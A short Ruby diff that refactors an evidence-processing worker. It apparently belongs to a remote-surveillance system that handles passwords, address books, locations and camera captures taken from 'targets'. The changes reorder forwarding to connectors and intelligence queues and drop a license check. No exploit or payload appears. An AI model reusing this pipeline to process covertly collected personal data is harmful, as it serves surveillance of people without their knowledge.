@@ -224,8 +224,9 @@ class InstanceWorker
     # check if there are matching alerts for this evidence
     RCS::DB::Alerting.new_evidence(evidence)
 
-    # forward the evidence to connectors (if any)
-    RCS::DB::Connectors.new_evidence(evidence)
+    # forward the evidence to connectors (if any) return if not kept in the db
+    # since the evidence is destroyed
+    return unless RCS::DB::Connectors.new_evidence(evidence)
 
     # add to the ocr processor queue
     if LicenseManager.instance.check :ocr
@@ -246,12 +247,8 @@ class InstanceWorker
       AggregatorQueue.add(@target._id, evidence._id, evidence.type)
     end
 
-    # pass the info to the intelligence module to extract handles (no license for this kind of evidence)
-    IntelligenceQueue.add(@target._id, evidence._id, evidence.type) if ['addressbook', 'password'].include? evidence.type
-
-    if LicenseManager.instance.check :correlation
-      IntelligenceQueue.add(@target._id, evidence._id, evidence.type) if ['position', 'camera'].include? evidence.type
-    end
+    # pass the info to the intelligence module to extract handles
+    IntelligenceQueue.add(@target._id, evidence._id, :evidence) if ['addressbook', 'password', 'position', 'camera'].include? evidence.type
   end
 
   def resume
